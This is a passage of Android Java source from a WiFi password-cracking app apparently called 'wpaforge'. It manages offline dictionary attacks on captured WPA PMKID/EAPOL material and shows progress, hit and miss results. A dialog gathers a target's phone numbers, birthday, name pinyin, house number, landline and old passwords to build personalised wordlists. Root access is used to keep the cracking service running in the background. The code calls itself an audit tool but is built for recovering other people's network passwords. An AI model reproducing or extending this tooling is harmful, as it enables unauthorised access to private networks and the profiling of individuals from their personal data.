        // 唯一可执行的那条若排在后面，会自动选中第 1 条（恰好不可执行），
        // 用户看到"就绪"却永远跑不了。
        int pick = -1;
        int scan = entries.size();
        for (int i = 0; i < scan; i++) {
            if (io.github.wlmosv_png.wpaforge.audit.MaterialDoctor
                    .examine(entries.get(i)).executable) {
                pick = i;
                break;
            }
        }
        if (pick < 0) pick = 0;
        selectMaterialEntry(pick);
        renderAudit();
    }

    /** 从普通文件读材料（仅「扫描 Download」这条尽力而为的路径会用）。 */
    private void runOfflineRead(final java.io.File f) {
        appendLog(L.s("读取材料: ", "Reading: ") + f.getName());
        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.OfflineImport.Result r;
            try {
                r = readOfflineText(new java.io.FileInputStream(f));
            } catch (Throwable t) {
                ui.post(() -> reportOffline(f.getName(), io.github.wlmosv_png.wpaforge.audit
                        .OfflineImport.classifyReadFailure(t), null, t));
                return;
            }
            ui.post(() -> reportOffline(f.getName(), r.status, r, null));
        }, "wpaforge-offline-read").start();
    }

    /** 当前字典的显示名（结果卡用）。 */
    private String dictNameNow() {
        return currentDictName.isEmpty() ? L.s("(未命名)", "(unnamed)") : currentDictName;
    }

    /** 材料类型的人话名。 */
    private String kindOf(io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e) {
        return e == null ? "" : (e.isPmkid() ? "PMKID" : "EAPOL");
    }

    /**
     * 组一条结果（各调用点只关心状态与计数，细节在这里收口）。
     *
     * <p>1.9.44 起把**本次实际使用的字典快照**一并记进结果：名字、来源、内容指纹、
     * 文件路径与文件指纹。没有指纹的话，事后只能看到「07 通用口令榜 · 3336 条」，
     * 无法证明这一次跑的到底是哪一份内容。
     */
    private io.github.wlmosv_png.wpaforge.audit.OfflineVerdict verdictOf(
            io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State st,
            io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e,
            String materialName,
            io.github.wlmosv_png.wpaforge.audit.DictSnapshot snap,
            long tested, long elapsedMs, String hitPassword, String note) {
        io.github.wlmosv_png.wpaforge.audit.DictSnapshot s = snap == null
                ? io.github.wlmosv_png.wpaforge.audit.DictSnapshot.none() : snap;
        return new io.github.wlmosv_png.wpaforge.audit.OfflineVerdict(st,
                materialName == null ? "" : materialName, kindOf(e),
                e == null ? "" : e.ssidLabel(),
                e == null ? "" : io.github.wlmosv_png.wpaforge.audit.Hc22000.hexMac(e.apMac),
                s.empty() ? dictNameNow() : s.name,
                s.empty() ? dictCount() : s.count,
                tested, elapsedMs, System.currentTimeMillis(),
                hitPassword, note,
                s.source, s.fingerprint(), s.filePath, s.fileId());
    }

    /** 已完成候选数占总数的比例；总数未知时给 {@code —}。 */
    private static String pct(long done, long total) {
        if (total <= 0) return "\u2014";
        return String.format(java.util.Locale.ROOT, "%.1f%%", done * 100.0 / total);
    }

    /**
     * 对一条材料跑当前字典 —— **先把字典冻结成快照**，再交给引擎。
     *
     * <h3>为什么必须冻结</h3>
     * 以前这里直接抓 {@code currentDict} 这个字段，而它不是原子的：
     * 派生字典是后台线程里算完由 {@code ui.post} 换上去的，落盘失败时路径还是空的。
     * 于是存在「界面已经显示字典 B、本次任务还在跑字典 A」的窗口。
     * 现在改走 {@link io.github.wlmosv_png.wpaforge.audit.AuditWorkflow#beginRun()}：
     * 拿到的是一份**不可变副本** + 与界面显示完全一致的内容指纹，
     * 之后再怎么换字典都动不了这一跑。
     *
     * <p>三段分流，<b>绝不混为一谈</b>：
     * <ol>
     *   <li>材料本身不完整 → 直接拒绝执行，结果为 BAD_MATERIAL；</li>
     *   <li>用户停止 → CANCELLED（不是未命中）；</li>
     *   <li>跑满字典没找到 → MISS（这才是未命中）。</li>
     * </ol>
     */
    private void runOfflineOne(final io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e) {
        if (offlineBusy) {
            Toast.makeText(this, L.s("正在比对，等这一轮结束", "Already running"),
                    Toast.LENGTH_SHORT).show();
            return;
        }

        // ---- 1) 材料诊断（与步骤 ② 同一份判据） ----
        final io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Report rep =
                io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.examine(e);
        lastEntry = e;
        lastReport = rep;
        if (!rep.executable) {
            workbench.selectEntry(workbench.selectedIndex(), false, rep.whyNot());
            auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.FAIL, e.label(),
                    L.s("材料异常，未执行: ", "Material problem, not executed: ") + rep.whyNot(),
                    rep.allIssues());
            setVerdict(verdictOf(
                    io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.BAD_MATERIAL,
                    e, workbench.materialName(), workbench.dictionary(), 0, 0, "", rep.whyNot()));
            renderAudit();
            return;
        }

        // ---- 2) 冻结本次任务（字典只在这里取一次） ----
        final io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Frozen frozen =
                workbench.beginRun();
        if (frozen == null) {
            String why = workbench.blocker();
            Toast.makeText(this, why.isEmpty()
                            ? L.s("当前无法开始", "Cannot start now") : why,
                    Toast.LENGTH_LONG).show();
            renderAudit();
            return;
        }
        final io.github.wlmosv_png.wpaforge.audit.DictSnapshot snap = frozen.snap;
        // 进程级独占：Activity 被回收后重建的新实例也能看见"上一个实例还在跑"。
        final String runToken = "offline|" + workbench.materialName() + "|"
                + snap.fingerprint() + "|" + System.currentTimeMillis();
        if (!io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.tryAcquire(runToken)) {
            workbench.endRun();
            Toast.makeText(this, L.s("进程内已有一次比对在进行（可能来自上一次会话），先等它结束。",
                    "A comparison is already running in this process (possibly from a previous "
                            + "session) - wait for it."), Toast.LENGTH_LONG).show();
            renderRunCard();
            return;
        }
        // 材料名在这一刻固定：结果卡的材料身份不能再读可变字段，
        // 否则「跑的过程中换材料」会把结果记到另一个文件名上。
        final String matName = workbench.materialName();
        frozenMaterialName = matName;
        io.github.wlmosv_png.wpaforge.OfflineRunStore.saveInflight(this,
                new io.github.wlmosv_png.wpaforge.audit.InflightRun(
                        matName, snap.name, snap.fingerprint(), System.currentTimeMillis()));
        renderInflight();
        final long t0 = System.currentTimeMillis();
        final long total = frozen.candidateCount();
        final long step = Math.max(1L, total / 100L);

        offlineBusy = true;
        offlineLastTested = 0L;
        stopStallWatchdog();
        final io.github.wlmosv_png.wpaforge.audit.AuditEngine engine =
                new io.github.wlmosv_png.wpaforge.audit.AuditEngine();
        runningEngine = engine;
        renderRunCard();
        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.INFO, e.label(),
                L.s("开始比对：", "Comparing: ") + snap.count + L.s(" 条候选", " candidates"),
                L.f("材料: %s\n目标 SSID: %s\n材料类型: %s\n字典: %s\n候选数: %d"
                                + "\n内容指纹: %s\n文件指纹: %s",
                        "Material: %s\nTarget SSID: %s\nType: %s\nDictionary: %s\n"
                                + "Candidates: %d\nContent id: %s\nFile id: %s",
                        e.label(), e.ssid == null ? "" : e.ssid, kindOf(e), snap.name,
                        snap.count, snap.fingerprint(),
                        snap.fileId().isEmpty() ? L.s("未落盘", "not on disk") : snap.fileId()));

        new Thread(() -> {
            final io.github.wlmosv_png.wpaforge.audit.AuditEngine.Result[] out = {null};
            final String[] err = {null};
            io.github.wlmosv_png.wpaforge.audit.AuditEngine.Progress cb =
                    new io.github.wlmosv_png.wpaforge.audit.AuditEngine.Progress() {
                @Override public void onProgress(long tested, long t, String found) {
                    // 每 ~1% 更新界面进度；每 ~10% 才写一条记录，避免把记录刷爆。
                    if (tested % step != 0) return;
                    final long tt = tested, nn = t;
                    final long el = System.currentTimeMillis() - t0;
                    ui.post(() -> {
                        offlineLastTested = tt;
                        updateLiveProgress(tt, nn, el);
                        if (tt % (step * 10L) == 0) {
                            auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.PROGRESS,
                                    "",
                                    tt + " / " + nn + "  (" + pct(tt, nn) + ")",
                                    L.f("已处理 %d / %d 条（%s），耗时 %s",
                                            "Processed %d / %d (%s), elapsed %s",
                                            tt, nn, pct(tt, nn), fmtDuration(el)));
                        }
                    });
                }
                @Override public void onDone(io.github.wlmosv_png.wpaforge.audit.AuditEngine.Result r) {
                    out[0] = r;
                }
                @Override public void onError(String message) {
                    err[0] = message;
                }
            };
            try {
                // 走冻结包 —— 「界面显示什么字典，这一跑就用什么字典」在结构上成立。
                frozen.run(engine, e, cb);
            } catch (Throwable t) {
                err[0] = String.valueOf(t);
            }

            final long ms = System.currentTimeMillis() - t0;
            final io.github.wlmosv_png.wpaforge.audit.AuditEngine.Result r = out[0];
            final String e0 = err[0];
            ui.post(() -> {
                try {
                    if (e0 != null || r == null) {
                        String why = e0 == null
                                ? L.s("引擎没有返回结果", "engine returned nothing") : e0;
                        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.FAIL,
                                snap.name, L.s("执行失败: ", "Failed: ") + why, why);
                        setVerdict(verdictOf(
                                io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.FAILED,
                                e, frozenMaterialName, snap, r == null ? 0 : r.tested, ms,
                                "", why));
                    } else if (r.cancelled) {
                        // 取消不是未命中 —— 单独一条状态，别糊在一起。
                        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.CANCEL,
                                snap.name,
                                L.s("已取消：跑到 ", "Cancelled at ") + r.tested + " / " + snap.count
                                        + L.s(" 条（不能算未命中）", " (this is not a miss)"),
                                L.f("已处理 %d / %d 条（%s），耗时 %s",
                                        "Processed %d / %d (%s), elapsed %s",
                                        r.tested, snap.count, pct(r.tested, snap.count),
                                        fmtDuration(ms)));
                        setVerdict(verdictOf(
                                io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.CANCELLED,
                                e, frozenMaterialName, snap, r.tested, ms, "",
                                L.s("用户停止", "stopped by user")));
                    } else if (r.hit) {
                        // 日志里**绝不出现明文口令**：只记位次与耗时。
                        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.OK,
                                snap.name,
                                L.s("命中（字典第 ", "HIT (rank ") + r.hitIndex
                                        + L.s(" 位，耗时 ", "), took ") + ms + " ms）",
                                L.f("字典: %s（内容指纹 %s）\n位次: %d / %d\n耗时: %s\n"
                                                + "口令明文不写入任何日志，只看结果卡。",
                                        "Dictionary: %s (content id %s)\nRank: %d / %d\n"
                                                + "Elapsed: %s\nThe plaintext password is never "
                                                + "written to any log - read it on the result card.",
                                        snap.name, snap.fingerprint(), r.hitIndex, snap.count,
                                        fmtDuration(ms)));
                        setVerdict(verdictOf(
                                io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.HIT,
                                e, frozenMaterialName, snap, r.tested, ms, r.hitPassword, ""));
                    } else {
                        auditLine(io.github.wlmosv_png.wpaforge.audit.RunLog.Kind.WARN,
                                snap.name,
                                L.s("未命中：跑完 ", "No hit: exhausted ") + r.tested
                                        + L.s(" 条，耗时 ", " entries in ") + ms + " ms",
                                L.f("字典: %s（内容指纹 %s）\n已跑完 %d / %d 条\n耗时: %s\n"
                                                + "这只说明本次材料与这本字典的候选集合没有匹配，"
                                                + "不代表目标密码不存在于其他字典。",
                                        "Dictionary: %s (content id %s)\nExhausted %d / %d\n"
                                                + "Elapsed: %s\nThis only means this material and "
                                                + "this candidate set found no match - the password "
                                                + "may well exist in another dictionary.",
                                        snap.name, snap.fingerprint(), r.tested, snap.count,
                                        fmtDuration(ms)));
                        setVerdict(verdictOf(
                                io.github.wlmosv_png.wpaforge.audit.OfflineVerdict.State.MISS,
                                e, frozenMaterialName, snap, r.tested, ms, "", ""));
                    }
                } finally {
                    offlineBusy = false;
                    runningEngine = null;
                    workbench.endRun();
                    io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.release(runToken);
                    io.github.wlmosv_png.wpaforge.OfflineRunStore.clearInflight(this);
                    stopStallWatchdog();
                    renderAudit();
                    renderOfflineVerdict();
                }
            });
        }, "wpaforge-offline-run").start();
    }

    /** 运行中刷新进度条（不重建整张卡）。 */
    private void updateLiveProgress(long tested, long total, long elapsedMs) {
        if (auditProgress == null) return;
        float p = total > 0 ? (float) ((double) tested / (double) total) : 0f;
        auditProgress.setProgress(p);
        auditProgress.setText(tested + " / " + total + L.s(" 条", " entries"),
                String.format(java.util.Locale.ROOT, "%.1f%%", p * 100f));
        String rate = elapsedMs > 0
                ? String.format(java.util.Locale.ROOT, "%.0f", tested * 1000.0 / elapsedMs)
                  + L.s(" 条/秒", "/s")
                : "";
        auditProgress.setSubText(L.s("已用 ", "elapsed ") + fmtDuration(elapsedMs)
                + (rate.isEmpty() ? "" : "  \u00b7  " + rate));
        auditProgress.requestLayout();
    }


    /**
     * 回到前台时检查：后台期间引擎是不是被系统挂起过。
     *
     * <p>判据：任务在跑，但最近一次心跳距今超过 90 秒 —— 说明中间一段时间
     * 引擎完全没推进。实测（ColorOS 15）后台会限制应用，表现为 su 命令卡住、
     * 引擎线程阻塞在管道读上，界面上看起来像「任务停了，回到应用才继续」。
     */
    private void checkBackgroundStall() {
        try {
            CrackService svc = liveService();
            if (svc == null || !svc.isWorking()) return;
            long last = Prefs.lastBeat(this);
            if (last <= 0) return;
            long gap = System.currentTimeMillis() - last;
            if (gap > 90_000L) {
                appendStreamColored(L.s(
                        "检测到后台期间任务被系统挂起过（约 " + (gap / 1000) + " 秒没有推进）。"
                        + "若反复出现，请到设置页看「保活状态」。",
                        "Background stall detected (~" + (gap / 1000) + "s without progress). "
                        + "See \"Keep-alive status\" in Settings if it repeats."), DANGER);
            }
        } catch (Throwable ignored) {}
    }

    /** 刷新「保活状态」卡片 */
    private void refreshKeepAlive() {
        if (keepAliveLabel == null) return;
        boolean batteryOk = false;
        try {
            android.os.PowerManager pm = (android.os.PowerManager)
                    getSystemService(android.content.Context.POWER_SERVICE);
            if (pm != null) batteryOk = pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable ignored) {}
        StringBuilder sb = new StringBuilder();
        sb.append(batteryOk ? "✓" : "✗")
                .append(L.s(" 电池优化豁免（关屏后不被限制）\n",
                        " battery-optimisation exemption (no throttling with screen off)\n"));
        sb.append(CrackService.isRunning() ? "✓" : "·")
                .append(L.s(" 前台服务（任务运行时自动开启）\n",
                        " foreground service (starts with the task)\n"));
        sb.append("·").append(L.s(" 系统深度睡眠白名单：任务启动时自动写入（需要 root）\n",
                " OS deep-sleep whitelist: written automatically at task start (needs root)\n"));
        keepAliveLabel.setText(sb.toString());
    }

    private void updateDictStatus() {
        if (dictStatus == null) return;
        if (usePlanMode) {
            io.github.wlmosv_png.wpaforge.audit.DictPlan lp = livePlan();
            if (lp != null && !lp.items.isEmpty()) {
                if (lp.state.isTerminal()) {
                    dictStatus.setText(L.s("多字典计划: 已结束（可清理或改回单字典）",
                            "Plan: finished (clear it or switch to single)"));
                } else {
                    dictStatus.setText(L.f("多字典计划: %d 本 · 当前第 %d 本",
                            "Plan: %d dictionaries · now #%d",
                            lp.items.size(), lp.displayIndex()));
                }
                return;
            }
        }
        int n = dictCount();
        if (n == 0) {
            dictStatus.setText(L.s("当前字典: 未选择", "Current dictionary: none"));
            return;
        }
        String skip = (currentDictSkipped > 0)
                ? L.s("（其中 " + currentDictSkipped + " 条本目标跑过，将自动跳过）",
                      " (" + currentDictSkipped + " already tried here \u2014 will be skipped)")
                : "";
        dictStatus.setText(L.s("当前字典: ", "Current dictionary: ")
                + sourceLabel(currentDictSource) + " · " + n + L.s(" 条", " entries") + skip);
    }

    /**
     * 破解页的「字典来源」。四个来源做成一屏**可点卡片**。
     *
     * 用户原话：「那个选择字典文件，不知道的人还以为不是个选项呢」。
     * 所以这一屏要同时回答三件事：
     *   ① 这行能不能点 —— 每行右侧自绘 `›`，不是纯文字
     *   ② 现在用的是哪个 —— 选中行换琥珀底 + 琥珀 `✓` + 琥珀标题，
     *      外加顶部一行「当前: …」
     *   ③ 点了会发生什么 —— 副标题给**真实条数与预计耗时**
     *      （三种方式的代价差几十倍：几十条 vs 一千七百多条，以前一个字都没提）
     *
     * 图标全部来自 {@link DictIcons}，Canvas 自绘，不依赖 emoji 字体。
     */
    private void showDictSource() {
        final io.github.wlmosv_png.wpaforge.audit.ProfileStore.Pick pick = profileForCurrentTarget();
        final io.github.wlmosv_png.wpaforge.audit.SeedModel cur = pick.seeds;
        final int budget = Prefs.deriveBudget(this);
        final io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();

        // 画像能出多少条：拿真实实现算一次（几毫秒），没有目标就用占位目标
        int seedCount = 0;
        try {
            io.github.wlmosv_png.wpaforge.core.NetRecord t = targetNet != null
                    ? targetNet
                    : new io.github.wlmosv_png.wpaforge.core.NetRecord("sample",
                            "00:00:00:00:00:00", -60, 2432,
                            io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2, false, "");
            seedCount = io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(
                    t, budget, null, cur,
                    io.github.wlmosv_png.wpaforge.audit.CnHot.load(this)).candidates.size();
        } catch (Throwable ignored) {}
        final int generic = genericDictSize();

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("用什么密码字典", "Which password source"),
                        L.s("先填线索最划算：实测命中有一半发生在第 1 条。",
                                "Fill hints first \u2014 half of the real hits landed on candidate #1."));
        d.addHint(L.s("当前: ", "Now: ") + sourceLabel(currentDictSource)
                + (dictCount() > 0 ? " · " + dictCount() + L.s(" 条", " entries") : "")
                + "\n" + L.s("本目标: ", "This target: ")
                + (Prefs.targetLabel(this).isEmpty() ? L.s("未选择网络", "no network picked")
                        : Prefs.targetLabel(this))
                + (tried.size() > 0
                        ? L.s(" · 已试过 " + tried.size() + " 条（会自动跳过）",
                              " \u00b7 " + tried.size() + " already tried (auto-skipped)")
                        : ""));

        d.addIconItem(DictIcons.Kind.PROFILE,
                L.s("已知密码线索", "Known hints"),
                (cur.isEmpty()
                        ? L.s("还没填。手机号 / 生日 / 姓名拼音 / 门牌 —— 最值钱的一步",
                                "Not filled. Phone / birthday / pinyin / floor \u2014 best payoff")
                        : L.f("已填 %d 项 · 可出 %d 条", "%d filled \u00b7 %d candidates",
                                cur.count(), seedCount))
                        ,
                false,
                dd -> showSeedDialog());

        d.addIconItem(DictIcons.Kind.TARGET,
                L.s("按目标派生（推荐）", "Derive from target (recommended)"),
                (cur.isEmpty()
                        ? L.s("还没填线索，只会出通用词表", "No hints \u2014 generic list only")
                        : L.s("线索 + 通用弱口令现场生成", "Hints + common weak lists, built on the fly"))
                        + " · " + seedCount + L.s(" 条 · 约 ", " entries \u00b7 ~")
                        + Prefs.estimate(this, seedCount),
                SRC_PROFILE.equals(currentDictSource),
                dd -> deriveFromTarget());

        d.addIconItem(DictIcons.Kind.FILE,
                L.s("用自己的字典文件", "Use your own wordlist"),
                L.s("从手机里挑一份现成的词表", "Pick an existing wordlist from the phone")
                        + (tried.size() > 0
                                ? L.s(" · 跑过的会自动跳过", " \u00b7 already-tried skipped") : ""),
                SRC_FILE.equals(currentDictSource),
                dd -> showDictPicker());

        d.addIconItem(DictIcons.Kind.GENERIC,
                L.s("通用弱口令表", "Generic weak list"),
                L.s("不看目标", "Target-agnostic") + " · " + generic + L.s(" 条 · 约 ", " entries \u00b7 ~")
                        + Prefs.estimate(this, generic),
                SRC_GENERIC.equals(currentDictSource),
                dd -> buildGenericDict());

        // ── 多字典计划（第一批补齐：与上面四种「单本字典」并列的第二种模式）──
        {
            io.github.wlmosv_png.wpaforge.audit.DictPlan plan =
                    io.github.wlmosv_png.wpaforge.audit.DictPlan.load(
                            io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
            String planSub = plan.items.isEmpty()
                    ? L.s("还没建。可在字典管理页把几本字典排成一个顺序", "Not built. Order several dictionaries in dictionary management")
                    : L.f("已建 %d 本 · 按顺序自动接力 · %s",
                          "%d dictionaries · auto-relay in order · %s",
                          plan.items.size(),
                          plan.autoAdvance ? L.s("自动连跑", "auto-advance") : L.s("单本停", "stop each"));
            d.addIconItem(DictIcons.Kind.LIST,
                    L.s("多字典计划（按顺序接力）", "Multi-dictionary plan (relay)"),
                    planSub,
                    usePlanMode,
                    dd -> showPlanPicker());
        }

        d.addItem(L.s("怎么选？看说明", "Which one? Read this"), dd -> showDictGuide());
        d.setNegative(L.s("关闭", "Close"), null);
        d.show();

        // 第一次进来先给一次说明 —— 用户提的问题本质就是"没人告诉我怎么来"
        if (!Prefs.dictGuideSeen(this)) {
            Prefs.setDictGuideSeen(this);
            showDictGuide();
        }
    }

    /**
     * 取"当前目标该用哪份线索"。
     *
     * 优先本目标档案；没有就从默认模板继承（**旧口令不继承**，见 ProfileStore.inherit）。
     * 返回的 fromTemplate 用来在界面和日志里显式说明"这不是本目标专用"。
     */
    /**
     * 当前目标键（**全应用唯一入口**）。
     *
     * 踩过的坑：保存和清空各算了一次 key，保存回退到 targetNet 算出来的键、
     * 清空直接用 SharedPreferences 里的值 —— 后者为空时去删 `unknown.seeds`，
     * 文件根本没删掉，用户看到的就是"清空了再打开内容还在"。
     * 现在只留这一个算法，并且算出来就写回去（自愈）。
     */
    private String currentTargetKey() {
        String key = Prefs.targetKey(this);
        if (key != null && !key.isEmpty()) return key;
        if (targetNet == null) return "";
        key = io.github.wlmosv_png.wpaforge.audit.TriedSet.targetKey(
                targetNet.bssid, targetNet.ssid);
        if (!key.isEmpty() && !"unknown".equals(key)) {
            Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);   // 自愈：写回
        }
        return key;
    }

    private io.github.wlmosv_png.wpaforge.audit.ProfileStore.Pick profileForCurrentTarget() {
        return io.github.wlmosv_png.wpaforge.audit.ProfileStore.pick(this, currentTargetKey());
    }

    /** 本目标的已试集合（界面预览用；不存在就是空的） */
    private io.github.wlmosv_png.wpaforge.audit.TriedSet triedForCurrentTarget() {
        String key = currentTargetKey();
        if (key == null || key.isEmpty()) return new io.github.wlmosv_png.wpaforge.audit.TriedSet();
        return io.github.wlmosv_png.wpaforge.audit.TriedSet.load(
                io.github.wlmosv_png.wpaforge.audit.TriedSet.fileFor(this, key));
    }

    /** 换目标后重算"将跳过多少条" —— 否则显示的还是上一个目标的数字 */
    private void refreshSkippedForCurrentDict() {
        currentDictSkipped = countSkipped(currentDict);
        updateDictStatus();
    }

    /** 这份候选里有多少条本目标已经跑过（会显示在界面上） */
    private int countSkipped(java.util.List<Candidate> list) {
        if (list == null || list.isEmpty()) return 0;
        io.github.wlmosv_png.wpaforge.audit.TriedSet t = triedForCurrentTarget();
        if (t.size() == 0) return 0;
        int n = 0;
        for (Candidate c : list) if (t.contains(c.password)) n++;
        return n;
    }

    /** 来源代码 → 显示文案 */
    /**
     * 审计页的字典来源标签。
     *
     * <p>与 {@link #sourceLabel} 分开：字典来源为空时 {@code sourceLabel} 给的是
     * 「未选择」—— 那是给「破解页那行状态」用的措辞，放到字典快照的「来源」字段上
     * 会让人以为根本没选字典（真机实测：字典名明明写着「07 通用口令榜」，
     * 来源却显示「未选择」）。这里明确写「未记录」。
     */
    private String auditSourceLabel(String code) {
        if (code == null || code.isEmpty()) return L.s("未记录", "not recorded");
        return sourceLabel(code);
    }

    private String sourceLabel(String code) {
        if (SRC_PROFILE.equals(code)) return L.s("画像派生", "profile-derived");
        if (SRC_GENERIC.equals(code)) return L.s("通用弱口令表", "generic weak list");
        if (SRC_FILE.equals(code)) return L.s("字典文件", "dictionary file");
        return L.s("未选择", "none");
    }

    /** 通用生成器条数（内容确定，缓存一次） */
    private int genericDictSize() {
        if (genericDictCount <= 0) {
            genericDictCount = DictGenerator.quick(200000).build().size();
        }
        return genericDictCount;
    }

    /**
     * 「字典怎么选」说明。
     *
     * 关键是**顺序**：现在用户看到的是四个平级选项，不知道先干哪个。
     * 这里明确说"先填线索、再派生、没线索才用通用表"，并把代价摆出来。
     */
    private void showDictGuide() {
        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("字典怎么选？", "How to choose"),
                        L.s("① 先填「已知密码线索」\n"
                                        + "手机号、生日、姓名拼音、门牌。这些东西任何词表里都没有，"
                                        + "填了就直接排在候选最前面。\n\n"
                                        + "② 再点「按目标派生」\n"
                                        + "它把线索和通用弱口令拼在一起，通常几十条、几分钟跑完。\n\n"
                                        + "③ 没有线索也行\n"
                                        + "那就点「通用弱口令表」。但那是一千七百多条，要跑一个多小时。\n\n"
                                        + "④ 已经收集了字典文件\n"
                                        + "选「用自己的字典文件」，直接加载。",
                                "1) Fill in \"Known hints\" first\n"
                                        + "Phone, birthday, pinyin, floor. No wordlist has these, "
                                        + "and they go straight to the front of the queue.\n\n"
                                        + "2) Then tap \"Derive from target\"\n"
                                        + "It combines your hints with common weak lists \u2014 "
                                        + "usually a few dozen candidates, a few minutes.\n\n"
                                        + "3) No hints? That is fine\n"
                                        + "Use \"Generic weak list\" \u2014 but that is ~1700 entries, "
                                        + "over an hour.\n\n"
                                        + "4) Already have a wordlist file\n"
                                        + "Pick \"Use your own wordlist\" and load it directly."));
        d.setNegative(L.s("知道了", "Got it"), null);
        d.setPositive(L.s("去填线索", "Fill hints"), dd -> showSeedDialog());
        d.show();
    }

    /**
     * 「已知密码线索」录入（社会工程学画像）。
     *
     * 设计依据：CUPP(6.6k★) / elpscrk(964★) 这些主流工具都只问"关于这个人你知道什么"，
     * 然后把信息**互相组合**，而不是对某一串数字做变形。
     * 所以这里问的每一项，都是"人会真的写进密码里的东西"。
     *
     * 全部可留空；留空时派生行为与旧版本一致。
     * 只存本机私有 SP，日志与界面一律走掩码。
     */
    private void showSeedDialog() {
        usePlanMode = false; selectedPlan = null;
        final String key = currentTargetKey();
        final io.github.wlmosv_png.wpaforge.audit.ProfileStore.Pick pick = profileForCurrentTarget();
        final io.github.wlmosv_png.wpaforge.audit.SeedModel cur = pick.seeds;

        String origin;
        if (pick.hasOwn && cur.isEmpty()) {
            origin = L.s("这个网标记为「不用线索」。", "Marked as \"no hints\" for this network.");
        } else if (pick.hasOwn) {
            origin = L.s("只对下面这个网生效。", "Only applies to the network at the bottom.");
        } else {
            origin = L.s("还没填过。填进去的会排在候选最前面。",
                    "Empty for now. What you fill in goes to the front of the queue.");
        }

        io.github.wlmosv_png.wpaforge.ui.NetDialog d =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.s("已知密码线索", "Known password hints"),
                        origin + "\n" + L.s("只存本机、不联网、不上传。",
                                "Stored on device only, never uploaded."));

        final android.widget.EditText phone = d.addField(
                L.s("手机号，多个用逗号分开（最多 4）", "Phone number(s), comma separated (max 4)"),
                joinComma(cur.phones));
        final android.widget.EditText names = d.addField(
                L.s("姓名/昵称拼音，多个用逗号（zhangwei,xiaobao）",
                        "Name/nickname pinyin, comma separated"),
                joinComma(cur.names));
        final android.widget.EditText bday = d.addField(
                L.s("生日 19900101 / 900101 / 0101", "Birthday 19900101 / 900101 / 0101"),
                cur.birthday);
        final android.widget.EditText house = d.addField(
                L.s("门牌 / 楼层 / 房间号", "House / floor / room no."),
                cur.houseNo);
        final android.widget.EditText landline = d.addField(
                L.s("宽带账号或固话", "Broadband account / landline"),
                cur.landline);
        final android.widget.EditText oldPw = d.addField(
                L.s("这个网以前用过的口令", "This network's previous password"),
                cur.oldPassword);
        final android.widget.EditText custom = d.addField(
                L.s("其他常出现的词，逗号分开", "Other words you'd expect, comma separated"),
                joinComma(cur.customs));
        d.addHint(L.s("留空即只按通用弱口令+中文高频派生。",
                "Leave blank to derive from common + Chinese weak lists only."));

        final boolean[] ssidOn = {cur.useSsid};
        final android.widget.TextView[] ssidRow = new android.widget.TextView[1];
        ssidRow[0] = d.addItem(ssidToggleLabel(ssidOn[0]), dd -> {
            ssidOn[0] = !ssidOn[0];
            ssidRow[0].setText(ssidToggleLabel(ssidOn[0]));
        });

        // 在编辑哪个网写在**底部**小字里：它是必要信息（否则不知道改的是谁的档案），
        // 但不该抢顶部的位置 —— 用户明确说过不希望在标题那行看到 wifi 名字。
        if (!Prefs.targetLabel(this).isEmpty()) {
            d.addHint(L.s("正在编辑: ", "Editing: ") + Prefs.targetLabel(this));
        }

        d.setNegative(L.s("清空本目标", "Clear this target"), dd -> {
            String k = key == null || key.isEmpty() ? currentTargetKey() : key;
            io.github.wlmosv_png.wpaforge.audit.ProfileStore.clearTarget(this, k);
            appendStream(L.s("已清空本目标的线索（这个网不会再自动套用任何内容）。",
                    "Cleared hints for this target (nothing will be auto-filled here again)."));
            updateDictStatus();
        });
        d.setPositive(L.s("保存", "Save"), dd -> {
            io.github.wlmosv_png.wpaforge.audit.SeedModel m =
                    readSeedForm(phone, names, bday, house, landline, oldPw, custom, ssidOn[0]);
            final String k = key == null || key.isEmpty() ? currentTargetKey() : key;
            io.github.wlmosv_png.wpaforge.audit.ProfileStore.saveTarget(this, k, m);

            io.github.wlmosv_png.wpaforge.audit.TriedSet tried = triedForCurrentTarget();
            io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.Result probe =
                    io.github.wlmosv_png.wpaforge.audit.TargetDictBuilder.build(
                            targetNet == null
                                    ? new io.github.wlmosv_png.wpaforge.core.NetRecord(
                                            "sample", "00:00:00:00:00:00", -60, 2432,
                                            io.github.wlmosv_png.wpaforge.core.NetRecord.Security.WPA2,
                                            false, "")
                                    : targetNet,
                            Prefs.deriveBudget(this),
                            null, m, io.github.wlmosv_png.wpaforge.audit.CnHot.load(this));
            int skipped = 0;
            for (Candidate c : probe.candidates) if (tried.contains(c.password)) skipped++;

            appendStream(m.isEmpty()
                    ? L.s("线索已清空", "Hints cleared")
                    : L.f("线索已保存 %d 项: %s", "Saved %d hint(s): %s", m.count(), m.masked()));
